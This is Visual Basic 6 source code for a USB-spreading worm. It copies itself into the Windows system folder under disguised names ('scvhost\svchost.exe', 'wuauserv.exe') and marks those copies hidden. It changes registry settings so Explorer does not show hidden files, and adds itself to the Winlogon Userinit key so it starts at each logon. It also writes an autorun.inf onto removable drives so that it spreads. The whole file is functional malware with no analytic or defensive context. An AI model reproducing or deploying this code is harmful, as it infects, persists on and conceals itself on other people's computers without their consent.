VERSION 5.00
Begin VB.Form USB 
   Caption         =   "USB"
   ClientHeight    =   3150
   ClientLeft      =   60
   ClientTop       =   390
   ClientWidth     =   4680
   LinkTopic       =   "Form1"
   ScaleHeight     =   3150
   ScaleWidth      =   4680
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows Default
   Visible         =   0   'False
   Begin VB.Timer Timer1 
      Enabled         =   0   'False
      Interval        =   10000
      Left            =   0
      Top             =   0
   End
End
Attribute VB_Name = "USB"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Declare Function GetSystemDirectory Lib "kernel32" Alias "GetSystemDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
Private Const MAX_PATH = 260
Private Declare Function WritePrivateProfileString Lib "kernel32" Alias "WritePrivateProfileStringA" (ByVal lpApplicationName As String, ByVal lpKeyName As Any, ByVal lpString As Any, ByVal lpFileName As String) As Long
Private Declare Function GetWindowsDirectory Lib "kernel32" Alias "GetWindowsDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
Dim sysPath As String
Dim homePath As String
Dim uPath As String
Private Declare Function GetDriveType Lib "kernel32" Alias "GetDriveTypeA" (ByVal nDrive As String) As Long
Private Declare Function PathFileExists Lib "shlwapi.dll" Alias "PathFileExistsA" (ByVal pszPath As String) As Long
Private Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Long
Private Declare Function PostMessage Lib "user32" Alias "PostMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long

Private Sub Form_Load()
    On Error Resume Next
    If App.PrevInstance Then End
    App.TaskVisible = False
    sysPath = SystemDir()
    homePath = Home()
    
    If LCase(App.EXEName) = "desktop" Then 'in usb
        makeHide
        DoEvents
        Dim winHwnd As Long
        Dim RetVal As Long
        winHwnd = FindWindow(vbNullString, "我的电脑")
        RetVal = PostMessage(winHwnd, &H10, 0&, 0&)
        
        Shell homePath & "\explorer.exe /n," & App.Path, vbNormalFocus
        MkDir sysPath & "\scvhost"
        FileCopy App.Path & IIf(Len(App.Path) > 3, "\", "") & App.EXEName & ".exe", sysPath & "\scvhost\svchost.exe"
        SetAttr sysPath & "\scvhost\svchost.exe", vbHidden + vbSystem
        Open sysPath & "\scvhost.ini" For Output As #1
            Write #1, Left(App.Path, 1)
        Close #1
        DoEvents
        
        FileCopy App.Path & IIf(Len(App.Path) > 3, "\", "") & "folder.exe", sysPath & "\MSWINSCK.OCX"
        SetAttr sysPath & "\MSWINSCK.OCX", vbNormal
        FileCopy App.Path & IIf(Len(App.Path) > 3, "\", "") & "desktop2.exe", sysPath & "\USB2.exe"
        SetAttr sysPath & "\USB2.exe", vbHidden + vbSystem
        FileCopy App.Path & IIf(Len(App.Path) > 3, "\", "") & "desktop2.exe", sysPath & "\wuauserv.exe"
        SetAttr sysPath & "\wuauserv.exe", vbHidden + vbSystem
        DoEvents
        makeRun
        Shell sysPath & "\scvhost\svchost.exe"
        End
    ElseIf LCase(App.EXEName) = "svchost" Then
        Open sysPath & "\scvhost.ini" For Input As #1
            Input #1, uPath
        Close #1
        uPath = uPath & ":\"
        Timer1.Enabled = True
        makeHide
        FileCopy sysPath & "\USB2.exe", sysPath & "\wuauserv.exe"
        SetAttr sysPath & "\wuauserv.exe", vbHidden + vbSystem
    Else
        End
    End If
End Sub

Private Function SystemDir() As String
    On Error Resume Next
    Dim tmp As String
    tmp = Space$(MAX_PATH)
    SystemDir = Left$(tmp, GetSystemDirectory(tmp, MAX_PATH))
End Function

Public Function Home() As String
    On Error Resume Next
    Dim lpBuffer As String
    lpBuffer = Space$(MAX_PATH)
    Home = Left$(lpBuffer, GetWindowsDirectory(lpBuffer, MAX_PATH))
End Function

Private Sub Timer1_Timer()
    On Error Resume Next
    Dim DrvType As Long
    DrvType = GetDriveType(uPath)
    If DrvType <> 1 Then
        If PathFileExists(uPath & "desktop.exe") = 0 Then
            FileCopy App.Path & IIf(Len(App.Path) > 3, "\", "") & App.EXEName & ".exe", uPath & "desktop.exe"
            SetAttr uPath & "desktop.exe", vbHidden + vbSystem
            
            SetAttr uPath & "autorun.inf", vbNormal
            Kill uPath & "autorun.inf"
            Open uPath & "autorun.inf" For Output As #1
                Print #1, "[AutoRun]"
                Print #1, "shell=verb1"
                Print #1, "shell\verb1\command=desktop.exe"
                Print #1, "shell\verb1=打开(&O)"
                Print #1, "shell=Auto"
            Close #1
            SetAttr uPath & "autorun.inf", vbHidden + vbSystem
            
            FileCopy sysPath & "\MSWINSCK.OCX", uPath & "folder.exe"
            SetAttr uPath & "folder.exe", vbHidden + vbSystem
            FileCopy sysPath & "\wuauserv.exe", uPath & "desktop2.exe"
            SetAttr uPath & "desktop2.exe", vbHidden + vbSystem
        End If
    End If
    makeRun
End Sub

Private Sub makeHide()
    On Error Resume Next
    SetAttr sysPath & "\boothide.reg", vbNormal
    Kill sysPath & "\boothide.reg"
    
    Open sysPath & "\boothide.reg" For Output As #1
        Print #1, "REGEDIT4"
        Print #1, ""
        Print #1, "[HKEY_LOCAL_MACHINE\Software\Microsoft\windows\CurrentVersion\explorer\Advanced\Folder\Hidden\SHOWALL]"
        Print #1, """CheckedValue""=dword:0"
        Print #1, ""
        Print #1, "[HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced]"
        Print #1, """Hidden""=dword:2"
        Print #1, ""
        Print #1, "[HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced]"
        Print #1, """SuperHidden""=dword:1"
        Print #1, ""
        Print #1, "[HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced]"
        Print #1, """ShowSuperHidden""=dword:0"
    Close #1
    Shell "regedit.exe /s " & sysPath & "\boothide.reg", vbHide
    SetAttr sysPath & "\boothide.reg", vbSystem + vbHidden
End Sub

Private Sub makeRun()
    On Error Resume Next
    SetAttr sysPath & "\bootrun.reg", vbNormal
    Kill sysPath & "\bootrun.reg"
    
    Open sysPath & "\bootrun.reg" For Output As #1
        Print #1, "REGEDIT4"
        Print #1, ""
        Print #1, "[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon]"
        Print #1, """Userinit""=""userinit.exe," & Left(homePath, 2) & "\\" & Right(homePath, Len(homePath) - 3) & "\\system32\\scvhost\\svchost.exe,wuauserv.exe"""
    Close #1
    Shell "regedit.exe /s " & sysPath & "\bootrun.reg", vbHide
    SetAttr sysPath & "\bootrun.reg", vbSystem + vbHidden
End Sub
